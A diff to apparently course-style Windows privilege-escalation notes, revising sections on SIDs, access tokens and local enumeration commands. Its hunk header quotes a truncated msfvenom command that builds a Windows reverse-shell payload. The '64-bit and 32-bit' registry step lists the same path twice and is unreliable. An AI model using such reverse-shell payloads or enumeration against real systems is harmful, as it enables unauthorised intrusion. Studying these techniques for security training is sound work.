@@ -553,9 +553,9 @@ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp L
 ```S-R-X-Y```
 
 - Literal `S` indicates that the string is an SID
-- Literal `R`stands for `revision` and that the overall SID structure is at its initial version
+- Literal `R`stands for `revision` and that the overall SID structure is at its initial version.it is always set to 1.
 - “X” determines the identifier authority. This is the authority that issues the SID. For example, “5” is 
-the most common value for the identifier authority. It specifies NT Authority and is used for local 
+the most common value for the identifier authority. It specifies `NT Authority` and is used for local 
 or domain users and groups.
 - “Y” represents the sub authorities of the identifier authority. Every SID consists of one or more sub 
 authorities. This part consists of the domain identifier and relative identifier (RID). The domain 
@@ -578,7 +578,7 @@ and “32” for built-in principals. The RID determines principals such as user
 ### ACCESS TOKEN
 - Once a user gets authenticaed by Windows,a token gets generated with set of attributes which limits the type of operation carried out by the user.
 - When a user starts a process or thread, a token will be assigned to these objects. This token, called a primary token, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user
-- A thread can also have an impersonation token739 assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.
+- A thread can also have an impersonation token assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.
 
 ### Mandatory Access Control
 
@@ -614,7 +614,7 @@ UAC consent prompt needs to be confirmed.
 
 ### Users
 
-- The next piece of information we are interested in are other users and groups on the system. We can use the `net user` command or the Get-LocalUser Cmdlet to obtain a list of all local users. Let’s use the latter by starting PowerShell and running Get-LocalUser
+- The next piece of information we are interested in are other users and groups on the system. We can use the `net user` command or the `Get-LocalUser` Cmdlet to obtain a list of all local users. Let’s use the latter by starting PowerShell and running Get-LocalUser
 
 ```bash
   powershell
@@ -650,13 +650,23 @@ Management Users can access it with WinRM.
 - For 64-bit and 32-bit applications , use
 
       Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"  | select displayname
-       Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
   
 
 - Finding running processes, use powershell `Get-Process` cmdlet
-- The listed processes might not be complete.Check for files in the `c:/` directory      
+- The listed processes might not be complete.Check for files in the `c:/` directory
+  
+--------------------------------
+
+### Hidden in Plain view
+
+-------------------------------
 
 
+
+
+
+-------------------------------
 
 ### Upgrading a shell to meterpreter
 
